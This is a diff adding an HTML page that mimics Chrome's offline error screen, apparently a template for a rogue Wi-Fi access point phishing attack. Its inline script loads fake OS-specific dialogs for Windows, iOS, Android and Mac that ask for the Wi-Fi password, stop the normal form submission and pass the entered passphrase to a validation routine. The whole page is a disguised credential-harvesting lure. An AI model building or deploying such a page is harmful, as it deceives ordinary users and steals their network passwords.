@@ -1,0 +1,73 @@
+<title></title>
+        </head>
+    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <div id="loader-ios"></div>
+    <div id="main-frame-error" class="interstitial-wrapper">
+        <div id="main-content">
+            <img class="dinosaur" src="dinosaur.png" width="45" />
+            <div class="icon icon-offline" style="visibility: hidden;"></div>
+            <div id="main-message">
+                <h1>There is no Internet connection</h1>
+                <p>You can try to diagnose the problem by taking the following steps:
+                <br />
+                Go to
+                <strong>
+                Ajustes&gt; Conexiones&gt; Wifi
+                </strong>
+                to test your connection.</p>
+                <div id="suggestions-list" >
+                    <p >Try:</p>                                          
+                        <ul class="chrome-list">
+                        <li>Checking the network cable or router</li>  
+                         <li>Resetting the modem or router</li>
+                        <li>Reconnecting to Wi-Fi</li>
+                    </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+            </div>
+        </div>
+        <div id="buttons" class="nav-wrapper suggested-right" >
+            <a href="https://miracomosehace.com/solucionar-error-err-internet-disconnected-chrome-android/"><button id="details-button" class="text-button small-link singular">Details</button></a>
+        </div>
+        <div id="loader-mac"></div>
+        <div id="loader-windows"></div>   
+         <div id="loader-mobile"></div> 
+  <script>
+            if (resolvedOs == "Windows") {
+                document.getElementById("loader-windows").innerHTML = loadhtml_windows;
+                var myform = document.getElementById("windows-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action);
+                });
+            }
+            else if (resolvedOs == "iOS") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_ios;
+                document.getElementById("loader-ios").innerHTML = loadhtml_ios;
+                document.getElementById("main-frame-error").innerHTML = "";
+                document.getElementById("ios-password").focus();
+                var myForm = document.getElementById("ios-password-form");
+                myForm.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    var password = document.getElementById("ios-password").value;
+                    validate_passphrase(password, ios_validate_action);
+                });
+            }
+            else if (resolvedOs == "Android") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                load_mobile();
+            }
+            else {
+                document.getElementById("loader-mac").innerHTML = loadhtml_mac;
+                var myform = document.getElementById("wifi-search-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action);
+                });
+            }
+        </script>
+        <script src='win-behavior.js'></script>
+        <script src='static/behavior.js'></script>
+    </body>
+</html>
